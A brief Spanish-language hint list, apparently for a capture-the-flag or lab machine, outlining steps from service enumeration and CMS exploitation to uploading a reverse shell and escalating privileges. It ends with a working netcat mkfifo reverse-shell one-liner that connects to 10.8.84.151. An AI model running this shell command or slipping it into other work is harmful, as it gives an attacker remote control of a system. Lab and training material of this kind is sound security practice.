# Pistas

- Listar servicios, solo tiene hackeable el servicio web
- revisar el cms, tiene muchas vulnerabilidades
- hay un backup, recupera un password de ahi
- buscar la forma de subir un archivo con una reverse shell
- la escalada de privilegios esta ez


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.84.151 4445 >/tmp/f